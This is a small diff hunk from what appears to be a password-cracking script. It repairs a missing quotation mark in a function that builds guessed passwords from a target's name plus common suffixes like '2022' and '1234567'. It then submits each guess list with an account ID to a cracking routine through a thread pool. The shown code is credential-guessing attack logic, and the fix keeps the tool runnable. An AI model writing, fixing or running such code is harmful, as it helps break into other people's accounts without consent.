@@ -182,7 +182,7 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'2022')
-					pwv.append(frs+'22334455)
+					pwv.append(frs+'22334455')
 					pwv.append(frs+'1234567')
 			if 'api' in method:
 				pool.submit(crack2,idf,pwv)
